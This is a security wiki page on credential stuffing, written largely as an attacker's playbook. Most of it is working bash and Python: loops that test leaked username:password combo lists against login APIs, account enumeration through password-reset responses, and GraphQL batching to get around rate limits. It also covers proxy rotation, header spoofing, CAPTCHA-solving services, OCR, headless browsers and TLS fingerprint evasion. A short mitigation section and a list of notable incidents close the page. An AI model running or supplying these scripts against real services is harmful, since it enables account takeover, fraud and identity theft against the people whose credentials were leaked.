---
title: Credential Stuffing
---

# Credential Stuffing

Credential Stuffing is an automated account takeover attack where large lists of compromised username/password pairs — sourced from prior data breaches — are tested against unrelated services. It exploits password reuse: credentials leaked from Site A likely unlock accounts on Site B.

Unlike brute force, it tests *known, real credentials* — unaffected by password complexity, resistant to dictionary-based defenses. Success rate: 0.2%–2% (1M pairs → 2,000–20,000 compromised accounts).

## Understanding Credential Stuffing Basics

### The Stuffing Workflow

1. **Acquisition** — Obtain a Combo List (Email:Password or Username:Password) from dark web markets, paste sites, or breach repos (Collection #1–5, Naz.API)
2. **Automation** — Load list into a checker (e.g., OpenBullet 2) configured with the target's login logic, success/failure indicators
3. **Proxy Rotation** — Route attempts through residential proxies so each request appears from a different legitimate home IP
4. **Triaging** — Confirmed logins ("Hits") are validated and checked for value: saved cards, loyalty balances, admin access

### Credential Stuffing vs. Brute Force

| Feature | Brute Force | Credential Stuffing |
| --- | --- | --- |
| Credential Source | Generated / wordlists | Known leaked credentials |
| Attack Nature | Guessing | Testing |
| Password Complexity Defense | Effective | Completely ineffective |
| Detection Profile | High volume, single account | Low volume, distributed across many accounts |
| Countermeasure | Account lockout | Behavioral analysis, proxy detection |

## Attack Surface

**Primary Targets:** 

1. Web login portals
2. Mobile API endpoints (`/api/v1/login`)
3. SSO/OAuth flows (Okta, Auth0, Azure AD)
4. Password reset flows 
5. Loyalty/rewards platforms 
6. Microservices & auth gateways

**Low-Yield / Not Applicable:**

| Pattern | Why Stuffing Fails |
| --- | --- |
| OTP-Only flows | No password to stuff |
| Mandatory MFA (TOTP / Hardware Key) | Second factor required |
| Passwordless (Magic Links, Passkeys, FIDO2) | No credential pair exists |
| Certificate-Based Auth (mTLS) | Device-bound, not replayable |

## Exploiting Credential Stuffing

### 1. Account Takeover (ATO)

```bash
# Core stuffing loop against a JSON API
while IFS=: read -r user pass; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://api.target.com/v1/auth \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$user\", \"password\":\"$pass\"}")
  [[ "$response" == "200" ]] && echo "[HIT] $user:$pass"
  [[ "$response" == "429" ]] && sleep 2
done < combo_list.txt
```

OpenBullet 2 Config pseudocode:

```
REQUEST POST /login  body: {email, password}  headers: {UA: <rotated>, X-Forwarded-For: <proxy>}
SUCCESS KEY:  response contains "access_token" OR status == 302
FAILURE KEY:  response contains "Invalid" OR status == 401
BAN KEY:      status == 429 OR response contains "Too many attempts"
```

### 2. Account / User Enumeration

Confirm which accounts exist before stuffing — reduces noise, focuses the attack.

```bash
# Password reset endpoint: 200 = exists, 404 = does not exist
while read -r email; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://target.com/forgot-password -d "email=$email")
  [[ "$code" == "200" ]] && echo "[VALID] $email"
done < emails.txt
```

Response differentials to look for:

- `"email not found"` vs `"check your inbox"` — different body = valid account confirmed
- HTTP 200 vs HTTP 404 on reset endpoint
- Response time delta — valid usernames take longer to process (timing oracle)

### 3. MFA Prompt Bombing (MFA Fatigue)

After confirming valid credentials, repeatedly trigger push MFA notifications until the victim approves out of fatigue or confusion.

```
Flow:
1. Confirm valid login pair via stuffing
2. Initiate login repeatedly → each triggers a push notification (Duo, MS Authenticator, Okta Verify)
3. Victim approves → full session access gained
```

Applicable to: Push-based MFA
Not applicable to: TOTP (code required per session), FIDO2/hardware keys

### 4. GraphQL Batching

GraphQL allows multiple operations per HTTP request — bypasses per-request rate limiting by testing many pairs in a single call.

```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation{login(email:\"a@x.com\",password:\"pass1\"){token}}"},
    {"query":"mutation{login(email:\"b@x.com\",password:\"pass2\"){token}}"},
    {"query":"mutation{login(email:\"c@x.com\",password:\"pass3\"){token}}"}
  ]'
# Each non-null token field in the response = confirmed hit
```

Why it works: Rate limiting counts HTTP requests, not operations within a request. 100 pairs in one request bypasses a "10 req/min" limit entirely.

### 5. Legacy / Mobile API Endpoint Discovery

Main login endpoints often have stronger protection. Mobile and internal API paths frequently do not.

```
Common unprotected paths to probe:
/api/v1/login        /api/v2/auth        /auth/token
/oauth/token         /mobile/login       /internal/authenticate

# Discover auth subdomains
subfinder -d target.com | grep -E "auth|login|account|id|sso|portal"
```

### 6. SSO Pivot

One valid credential against an identity provider (Okta, Azure AD, Auth0) grants access to every downstream application in the SSO domain.

```
Flow:
1. Identify IdP (check login page redirect, SAML assertions, OAuth issuer field)
2. Stuff credential list against the IdP login endpoint
3. On hit → enumerate connected apps via SSO dashboard
4. Access all downstream services without further authentication
```

### Test Cases

| Scenario | Payload / Action | Expected Outcome |
| --- | --- | --- |
| ATO | Valid combo against `/login` | 302 redirect or `token` in response body |
| Account Enumeration | Email list against `/forgot-password` | 200 vs 404 reveals registered accounts |
| Timing Oracle | Valid vs invalid username at login | Valid usernames respond slower |
| GraphQL Batching | 50 login mutations in one HTTP request | Bypasses per-request rate limit |
| Mobile API | Target `/api/v1/login` instead of web form | Endpoint lacks CAPTCHA or JS challenge |
| MFA Fatigue | Repeated login trigger after credential confirm | Push notification sent each attempt |
| SSO Pivot | Stuff against Okta / Azure AD login | Single hit → access to all linked apps |

## Bypassing Defences

### 1. IP Rotation via Residential Proxies

Residential proxies assign a clean home-user IP per request — defeats per-IP lockout entirely. Residential ASNs are indistinguishable from organic traffic.

```bash
# proxychains with rotating list
proxychains4 -q curl -s -X POST https://target.com/login \
  -d "username=victim@x.com&password=pass123"

# Per-request proxy
curl -x socks5h://user:pass@proxy.provider.com:1080 \
  -X POST https://target.com/api/login \
  -d '{"email":"test@x.com","password":"pass123"}'
```

Proxy sources: Bright Data, Oxylabs, IPRoyal

### 2. Request Jitter

Uniform request cadence is a bot signal. Random delays between requests mimic human behavior and evade timing-based detection.

```bash
while IFS=: read -r user pass; do
  curl -s -X POST https://target.com/login -d "username=$user&password=$pass"
  sleep $(( RANDOM % 5 + 1 ))
done < combo_list.txt
```

### 3. Header Spoofing

Rotate `User-Agent`, `X-Forwarded-For`, `Accept-Language`, and `Referer` — the headers WAFs and bot engines inspect most.

```bash
curl -X POST https://target.com/login \
  -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)" \
  -H "X-Forwarded-For: 203.0.113.45" \
  -H "Accept-Language: en-US,en;q=0.9" \
  -H "Referer: https://target.com/" \
  -d "username=test@x.com&password=pass123"
```

### 4. CAPTCHA Bypass

**Solving Services** — Integrate 2captcha / CapSolver APIs into checker configs for near-real-time CAPTCHA resolution.

```python
# Submit to solving service, poll for result, inject token into login request
response = requests.post('http://2captcha.com/in.php', data={
    'key': 'API_KEY', 'method': 'userrecaptcha',
    'googlekey': 'SITE_KEY', 'pageurl': 'https://target.com/login'})
# Poll → inject returned g-recaptcha-response token into POST body
```

**OCR for Image CAPTCHAs** — Extract text from simple image challenges automatically.

```python
from PIL import Image
import pytesseract, requests
from io import BytesIO

img = Image.open(BytesIO(requests.get('https://target.com/captcha.png').content)).convert('L')
answer = pytesseract.image_to_string(img, config='--psm 8').strip()
```

**Headless Browser** — Renders full JS environment including mouse movement, keystroke cadence, and reCAPTCHA v3 scoring.

```jsx
const page = await browser.newPage();
await page.setViewportSize({ width: 1366, height: 768 });
await page.mouse.move(400, 300);
await page.type('#email', email, { delay: 120 });    // simulated typing cadence
await page.type('#password', pass, { delay: 95 });
await page.click('#submit');
```

### 5. TLS & Behavioral Fingerprint Evasion

| Defence Signal | Evasion Technique |
| --- | --- |
| JA3/JA3S TLS fingerprint | Use Playwright — matches real browser TLS ClientHello |
| HTTP/2 fingerprint (JA4) | `curl-impersonate` replicates legitimate browser H2 frames |
| Mouse / keystroke biometrics | Randomized delays and simulated mouse paths in headless automation |
| Device fingerprint | Reuse same browser profile per account for consistent fingerprint |
| Cookie / session freshness | Fetch a fresh session cookie per attempt before submitting credentials |

```bash
# curl-impersonate — exact TLS + HTTP/2 fingerprint of Chrome
curl_chrome110 -X POST https://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@x.com","password":"pass123"}'
```

## Detection Techniques (Offensive Perspective)

### Manual Detection — Confirming a Hit

**Status Code Anomalies**

```
Failed login baseline:  HTTP 401 / 403 / 200 (with error body)
Hit indicators:         HTTP 200 (with token body) / HTTP 302 redirect to /dashboard
```

**Response Length Delta**

```bash
# Hits return significantly more content (dashboard HTML, token payload)
curl -s -o /dev/null -w "%{size_download} %{http_code}" \
  -X POST https://target.com/login \
  -d "username=test@x.com&password=pass"
# Failed: 312 200
# Hit:   4821 200  ← large body delta = likely authenticated
```

**Keyword Matching**

```
Success keywords:  token, access_token, session, welcome, dashboard, Bearer
Failure keywords:  invalid, incorrect, unauthorized, wrong password
Ban keywords:      rate limit, too many, blocked, captcha
```

**Redirect Behavior**

```bash
curl -s -L -o /dev/null -w "%{url_effective}" \
  -X POST https://target.com/login -d "username=x&password=y"
# Hit:  https://target.com/dashboard
# Fail: https://target.com/login?error=1
```

### Automated Detection

```bash
# Grep response body for success tokens
while IFS=: read -r user pass; do
  response=$(curl -s -X POST https://target.com/api/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$user\",\"password\":\"$pass\"}")
  echo "$response" | grep -qE '"token"|"access_token"|"session_id"' \
    && echo "[HIT] $user:$pass"
done < combo_list.txt
```

```python
import requests, re

for line in open('combo_list.txt'):
    user, pwd = line.strip().split(':')
    r = requests.post('https://target.com/api/login',
                      json={'email': user, 'password': pwd},
                      allow_redirects=False)
    if r.status_code in [200, 302]:
        if re.search(r'token|session|welcome|Bearer', r.text, re.I):
            print(f'[HIT] {user}:{pwd}')
        elif len(r.content) > 1000:          # response size anomaly
            print(f'[POSSIBLE HIT] {user}:{pwd}')
```

```bash
# GraphQL — parse token fields from batched response
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"mutation{login(email:\"a@x.com\",password:\"p1\"){token}}"},
       {"query":"mutation{login(email:\"b@x.com\",password:\"p2\"){token}}"}]' \
| python3 -c "
import sys,json
for i,r in enumerate(json.load(sys.stdin)):
    t = r.get('data',{}).get('login',{}).get('token')
    if t: print(f'[HIT] index {i}: {t}')
"
```

## Impact

- **Account Takeover (ATO)** — Full access to victim accounts: PII, saved addresses, order history, linked financials
- **Financial Fraud** — Stored payment methods drained; unauthorized purchases, fund transfers, gift card abuse
- **Identity Theft** — PII (DOB, SSN, address) enables downstream fraud, loan applications, social engineering
- **Credential Resale** — Verified hits sold on dark web markets (streaming logins <$5; banking accounts up to hundreds)
- **Lateral Pivot via SSO** — One stuffed IdP credential cascades access across all downstream applications
- **Auth DoS** — High-volume stuffing saturates auth servers, causing login failures for legitimate users

## Tools

| Tool | Purpose |
| --- | --- |
| OpenBullet 2 | Full-featured stuffing checker with config scripting |
| Hydra / Medusa | Multi-protocol login brute-forcer for non-HTTP services |
| ffuf | Fast web fuzzer; adaptable for credential stuffing via POST wordlists |
| Burp Suite Intruder | HTTP-level stuffing with payload lists and proxy chaining |
| Playwright / Puppeteer | Headless browser for CAPTCHA bypass and JS-rendered login flows |
| proxychains4 | Route tool traffic through SOCKS/HTTP proxy chains |
| curl-impersonate | Mimics exact TLS and HTTP/2 browser fingerprints |
| 2captcha / CapSolver | CAPTCHA solving service APIs |
| pytesseract | OCR-based image CAPTCHA text extraction |
| Have I Been Pwned API | Breached credential lookup for attack validation |

## Mitigation & Prevention

**Multi-Factor Authentication** — Enforce TOTP, FIDO2/WebAuthn, or push MFA. Avoid SMS-only (vulnerable to SIM swapping).

**Breached Credential Detection** — Check passwords against known breach datasets at login and registration (NIST SP 800-63B). Reject or force reset of any breach-exposed password.

**Adaptive Rate Limiting** — Throttle on platform-wide failure rate, not per-IP or per-user. 10,000 IPs each making one failed attempt in 10 minutes is one attack.

**Bot Management** — Deploy Cloudflare Bot Management, Akamai Account Protector, or F5 with TLS/HTTP/2 fingerprinting (JA3/JA4). IP blocklists are insufficient against residential proxies.

**Account Enumeration Prevention** — Return identical responses — body, status code, and timing — for valid and invalid usernames. Timing side-channels are as actionable as explicit error messages.

**CAPTCHA & Behavioral Challenges** — Deploy invisible behavioral CAPTCHA (hCaptcha, reCAPTCHA v3, Cloudflare Turnstile). Reserve hard challenges for high bot-likelihood sessions.

## Good To Read

### Notable Incidents

- **23andMe (2023):** Stuffed credentials from prior breaches over five months without detection. Exploited the "DNA Relatives" feature to amplify initial hits into ~6.9M user records exposed. $30M class-action settlement + £2.31M UK ICO fine. [BleepingComputer](https://www.bleepingcomputer.com/news/security/genetics-firm-23andme-says-user-data-stolen-in-credential-stuffing-attack/)
- **PayPal (Dec 2022):** Two-day attack compromised ~35,000 accounts, exposing SSNs and tax IDs. Absence of mandatory MFA cited as root failure. $2M NY State settlement. [BleepingComputer](https://www.bleepingcomputer.com/news/security/paypal-accounts-breached-in-large-scale-credential-stuffing-attack/)
- **DraftKings (Nov 2022):** ~68,000 sports betting accounts compromised, ~$300,000 drained from linked bank accounts. [BleepingComputer](https://www.bleepingcomputer.com/news/security/hackers-steal-300-000-in-draftkings-credential-stuffing-attack/)
- **HackerOne (Oct 2020):** Attack detected 5 days late during a weekly log audit — highlighted MFA enforcement gaps even on security-focused platforms. [HackerOne Report #1007689](https://hackerone.com/reports/1007689)

## References

- [OWASP: Credential Stuffing Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html)
- [NIST SP 800-63B: Breached Password Guidance](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [FBI PIN: Residential Proxies in Credential Stuffing (2022)](https://www.ic3.gov/Media/News/2022/220818.pdf)
- [Have I Been Pwned: Pwned Passwords API (k-Anonymity Model)](https://haveibeenpwned.com/API/v3#PwnedPasswords)
- [F5: 2024 Credential Stuffing Report](https://www.f5.com/glossary/credential-stuffing-attack)
- [Cloudflare: Understanding Credential Stuffing Attacks](https://www.cloudflare.com/learning/bots/what-is-credential-stuffing/)
- [PortSwigger: Credential Stuffing Testing Workflow](https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/authentication-mechanisms/credential-stuffing)
- [Wikipedia: Credential Stuffing — Incident Timeline](https://en.wikipedia.org/wiki/Credential_stuffing)